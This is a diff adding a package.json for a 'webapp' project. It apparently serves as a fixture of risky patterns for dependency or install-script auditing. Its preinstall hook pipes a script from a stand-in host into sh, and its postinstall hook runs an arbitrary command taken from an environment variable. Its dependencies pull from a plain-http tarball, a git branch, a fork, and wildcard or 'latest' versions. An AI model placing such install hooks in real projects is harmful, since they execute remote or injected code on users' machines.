@@ -1,0 +1,21 @@
+{
+  "name": "webapp",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s https://cdn.example.test/setup.sh | sh",
+    "postinstall": "node -e \"require('child_process').execSync(process.env.CMD)\"",
+    "prepare": "husky install",
+    "build": "tsc"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "left-pad-fork": "github:someone/left-pad",
+    "internal-ui": "git+https://git.example.test/ui.git#main",
+    "legacy-lib": "http://files.example.test/legacy-lib-1.0.0.tgz",
+    "utils": "*",
+    "chart-kit": "latest"
+  },
+  "devDependencies": {
+    "shared": "file:../shared"
+  }
+}
